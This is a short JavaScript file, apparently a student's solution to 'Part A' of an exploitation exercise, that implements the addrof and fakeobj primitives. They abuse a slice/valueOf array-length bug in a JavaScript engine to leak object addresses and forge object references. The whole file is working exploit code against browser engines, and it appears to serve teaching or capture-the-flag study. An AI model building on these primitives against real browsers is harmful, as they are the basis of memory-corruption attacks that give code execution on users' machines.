/*
 * TODO: Part A solution goes here!
 */
function addrof(object) {
        var a = [];
        for (var i = 0; i < 100; i++)
            a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles

        var hax = {valueOf: function() {
            a.length = 0;
            a = [object];
            return 4;
        }};

        var b = a.slice(0, hax);
        return Int64.fromDouble(b[3]);
    }

    function fakeobj(addr) {
        var a = [];
        for (var i = 0; i < 100; i++)
            a.push({});     // Array must be of type ArrayWithContiguous

        addr = addr.asDouble();
        var hax = {valueOf: function() {
            a.length = 0;
            a = [addr];
            return 4;
        }};

        return a.slice(0, hax)[3];
    }
